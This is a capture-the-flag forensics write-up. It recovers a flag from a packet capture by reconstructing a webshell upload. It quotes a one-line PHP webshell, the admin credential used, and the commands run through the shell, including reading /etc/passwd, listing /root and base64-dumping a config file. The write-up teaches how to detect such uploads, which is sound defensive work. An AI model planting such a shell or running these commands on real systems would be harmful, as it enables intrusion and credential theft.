# NULLSTAR // BREACH 4

**Status:** solved

**Flag:** `0xV0ID{sh3ll.php}` (recovered from capture.pcap, verified against pcap — not submitted)

**Technique tags:** forensics, pcap, webshell, multipart upload

**Signals:** after the successful Basic-auth login, the attacker POSTs to `/admin/upload.php` and then hits `/uploads/...?cmd=` — the uploaded webshell name is the filename in the multipart body.

**Method**
- Frame 104: `POST /admin/upload.php` (authorized with `admin:S3cr3t_P4ss!`), body:
  - `Content-Disposition: form-data; name="file"; filename="sh3ll.php"`
  - `Content-Type: application/x-php`
  - `<?php system($_GET['cmd']); ?>`
- Follow-up frames 114-144: `GET /uploads/sh3ll.php?cmd=id` / `cat /etc/passwd` / `ls -la /root` / `base64 /opt/app/config.php` — RCE via the uploaded shell.

**Verification:** decoded TCP payload of the POST shows `filename="sh3ll.php"`; the subsequent requests reference `/uploads/sh3ll.php`.

**Reusable takeaway:** webshell uploads are visible in pcap as multipart POST bodies; grep the raw bytes for `filename="..."` and confirm by the `?cmd=` requests that follow.

## Solve
`solver.py` decodes the upload POST and regex-extracts the multipart filename.
